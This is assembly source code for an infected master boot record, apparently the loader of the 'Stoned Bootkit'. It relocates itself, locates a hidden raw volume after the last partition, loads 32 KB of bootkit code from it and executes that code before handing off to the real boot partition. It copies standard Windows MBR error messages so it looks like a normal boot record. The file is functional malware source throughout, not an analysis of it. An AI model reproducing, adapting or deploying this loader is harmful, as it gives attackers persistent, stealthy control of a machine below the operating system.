; Инициализация регистров.
xor  ax, ax
mov  ds, ax
mov  es, ax
mov  ss, ax
mov  sp, 0700h            ; Настраиваем вершину стека на адрес 700h

; Пермещаем загрузчик в память по адресу 0000h:0700h
mov  si, 7C00h
mov  di, 0700h
mov  cx, 512 / 4

cld                       ; Увеличение регистров edi, esi на 1 при строковых операциях.
rep  movsd                ; Копируем MBR

jmp  0000h:mbr_reloc

mbr_head_size equ ($ - $$)

mbr_reloc:                ; Здесь выполнение начинается с адреса 0000h:0700h

org  0700h

; get the RawFS volume start sector
xor  eax, eax             ; eax will hold last partition table sector
mov  si, partition_table  ; В si указатель на таблицу разделов
mov  cl, 4                ; 4 элемента таблицы разделов.

Get_RawFS_Start_Sector:
cmp [si+8],eax                                                                  ; check if Partition is more behind the current one
jc Verified_Partition

; if the partition is behind this one, then sector AFTER that partition will be remembered
mov eax,[si+8]                                                                  ; start sector
add eax,[si+12]                                                                 ; + count of sectors (size of partition)

Verified_Partition:
add  si,16                                                                       ; next Partition Table entry
loop Get_RawFS_Start_Sector

or eax,eax                                                                      ; not found? (should not occur)
jz Boot_Partition


; load the bootkit into memory
add eax,2                                                                       ; \Bootkit starts always at sector 2 of RawFS volume
mov cx,32*1024 / 512                                                            ; read 32 KB into memory
mov bx,7C00h                                                                    ; read to 0000h:7C00h
call Installation_Check_Read
jc Boot_Partition

; EXECUTE THE BOOTKIT
jmp 0000h:7C00h



Boot_Partition:

; find a bootable partition
mov si,Partition_Table                              ; look-up in the partition table
mov cl,4                                            ; 4 Partition Table entries

Next_Partition_Table_Entry:
cmp byte [si],0x80                                  ; active (bootable)?
je Found_Bootable_Partition
cmp [si],ch                                         ; zero? (indicates error)
jnz Error_1
add si,16                                           ; seek to next entry
loop Next_Partition_Table_Entry

; otherwise error - return to BIOS (nice!)
int 18h


Found_Bootable_Partition:

; read Partition Bootloader (first sector of partition)
mov eax,[si+8]                                      ; start sector of partition
mov bx,sp                                           ; read it to the stack - 7C00h
mov cx,1                                            ; 1 sector to read
call Installation_Check_Read
jnc Read_Partition_Bootloader

; error loading Partition Bootloader - try loading through old Read function
mov cx,[si+0x2]                                     ; sector number (in CHS format) of partition
mov ax,0x201                                        ; function Read Sectors, 1 sector
int 0x13
jc Error_2                                          ; if also not working, write out error

Read_Partition_Bootloader:

; verify if it's a valid Bootloader
cmp word [0x7DFE],0AA55h                            ; verify valid bootloader (check magic number)
jnz Error_3

; execute Partition Boot Record
jmp word 0000h:7C00h



Installation_Check_Read:

; make an installation check and support check for hard drive 0
;   required: available
;             LBA support (Extended Functions)
; 
; cx = count of sectors to read
; bx = transfer buffer (offset)
; dl = drive to operate
; es = transfer buffer (segment)
; eax = sector number

pushad                                              ; store register for later usage
mov bx,0x55aa                                       ; fixed parameter
mov ah,0x41                                         ; function Installation Check
int 0x13
jnc Installation_Check_Successful                   ; CF clear if successful

Installation_Check_Failed:
stc                                                 ; return with error
popad

ret

Installation_Check_Successful:
cmp bx,0AA55h                                       ; BX = AA55h if installed
jnz Installation_Check_Failed
test cl,00000001b                                   ; bit 0: extended disk access functions (AH=42h-44h,47h,48h) supported
jz Installation_Check_Failed

; passed
popad
pushad

; read sectors
push word 0                                         ;   qword padding
push word 0                                         ;   qword padding
push eax                                            ;   sector number
push es                                             ;   transfer buffer (segment)
push bx                                             ;   transfer buffer (offset)
push cx                                             ;   number of blocks to transfer
push word 10h                                       ;   size of packet = 10h
mov ah,0x42                                         ; function Extended Read
mov si,sp                                           ; disk address packet stored on stack
int 0x13                                            ; read the sector[s]!

popaw
popad

ret



Print_Message:

; [sp] = Message to display

pop si                                              ; return ip = message to display
lodsb                                               ; next character
Endless_Loop:
or al,al
jz Endless_Loop                                     ; endless loop (if error message => do nothing)
push si                                             ; store message offset for next loop run
push ds
mov bx,0x7                                          ; foreground color = gray
mov ah,0Eh                                          ; function Teletype Output
int 0x10
pop ds

jmp short Print_Message



; jump to following addresses to print message

Error_1:
call Print_Message
Error_Message_1         db  "Invalid partition table", 0

Error_2:
call Print_Message
Error_Message_2         db  "Error loading operating system", 0

Error_3:
call Print_Message
Error_Message_3         db  "Missing operating system", 0



; TrueCrypt message =) [disabled]
;times 196h-($-$$)   db  0
;db  " Stoned Bootkit 2010", 0




; language descriptions [should be used now but unset!!]
times 1B5h-($-$$)   db  0

; Microsoft Error linguistic message offsets
Error_Message_1_length  db  02Ch                  ; *NOT UPDATED*
Error_Message_2_length  db  048h                  ; still bad bad virus writer...
Error_Message_3_length  db  06Eh                  ; forgot to update error messages...



; Disk Signature

times 440-($-$$) db 0

Disk_Signature          dd      0       ; required for Windows
                        dw      0       ; drive identification



; Partition Table (set up for test debugging environment)

times 1BEh-($-$$) db 0


partition_table:

Partition_1
    Partition_1_bootable        db      0
    Partition_1_Start_CHS       db      00h, 01h, 01h
    Partition_1_Type            db      04h                 ; FAT16
    Partition_1_End_CHS         db      0, 0, 0
    Partition_1_Start_LBA       dd      63
    Partition_1_Sectors         dd      16128               ; ~ 8 MB
Partition_2
    Partition_2_bootable        db      80h                 ; active partition
    Partition_2_Start_CHS       db      0, 0, 0
    Partition_2_Type            db      07h                 ; NTFS
    Partition_2_End_CHS         db      0, 0, 0
    Partition_2_Start_LBA       dd      16128 + 63
    Partition_2_Sectors         dd      40952               ; ~ 20 MB
Partition_3
    Partition_3_bootable        db      0
    Partition_3_Start_CHS       db      0, 0, 0
    Partition_3_Type            db      0
    Partition_3_End_CHS         db      0, 0, 0
    Partition_3_Start_LBA       dd      0
    Partition_3_Sectors         dd      0
Partition_4
    Partition_4_bootable        db      0
    Partition_4_Start_CHS       db      0, 0, 0
    Partition_4_Type            db      0
    Partition_4_End_CHS         db      0, 0, 0
    Partition_4_Start_LBA       dd      0
    Partition_4_Sectors         dd      0


times 510 - ($ - $$ - mbr_head_size) db 0

mbr_signature dw 0AA55h
